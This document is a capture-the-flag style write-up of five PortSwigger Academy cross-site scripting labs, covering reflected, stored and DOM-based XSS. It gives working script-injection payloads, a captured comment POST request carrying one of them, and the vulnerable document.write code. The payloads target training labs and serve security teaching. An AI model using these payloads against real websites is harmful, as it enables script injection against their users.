### Reflected XSS into HTML context with nothing encoded

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
To solve the lab, perform a cross-site scripting attack that calls the alert function.

![Blog Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-1.png)

Enter Payload in Search Box `"><script>alert("document.domain")`

Alert will popup with domain name.

![Blog Page XSS](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-2.png)

---

### Stored XSS into HTML context with nothing encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.
To solve this lab, submit a comment that calls the alert function when the blog post is viewed.

![Blog Post Comment Section](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-3.png)

No need Burp Suite to Solve this Lab but We can use if we want.

Capture the request using Burp Suite.

Payload: `"><script>alert(document.domain);</script>`

```
POST /post/comment HTTP/1.1
Host: ac841f9c1fd9ea60c0291fea003500a2.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Origin: https://ac841f9c1fd9ea60c0291fea003500a2.web-security-academy.net
DNT: 1
Connection: close
Referer: https://ac841f9c1fd9ea60c0291fea003500a2.web-security-academy.net/post?postId=2
Cookie: session=nvcsC6Bs0gnxD37ywSj3XJcq9l8tfbOP
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

csrf=bG4fJRPYljHJkbsBJnlQbxArwGklxTXq&postId=2&comment=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&name=Test&email=test%40test.com&website=https%3A%2F%2Fwww.tests.com

```

![Alert Popup](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-4.png)

---

### DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

![Blog Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-5.png)

Enter any test we will notice that that text include in image.

Payload `"><script>alert(document.domain);</script>`

![Alert Popup](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-6.png)

---

### DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

![Store Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-7.png)

Enter Payload https://acac1f3a1ed422a1c0fe737c00d8008f.web-security-academy.net/product?productId=1&storeId=%3Cscript%3Ealert(1)%3C/script%3E

```html
<script>
  var stores = ["London", "Paris", "Milan"];
  var store = new URLSearchParams(window.location.search).get("storeId");
  document.write('<select name="storeId">');
  if (store) {
    document.write("<option selected>" + store + "</option>");
  }
  for (var i = 0; i < stores.length; i++) {
    if (stores[i] === store) {
      continue;
    }
    document.write("<option>" + stores[i] + "</option>");
  }
  document.write("</select>");
</script>
```

![Alert Popup](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-8.png)

---

### DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

![Blog Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-9.png)

<img src="1" onerror="alert(1)">

![Blog Page Alert](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Cross-Site-Scripting/XSS-10.png)

---
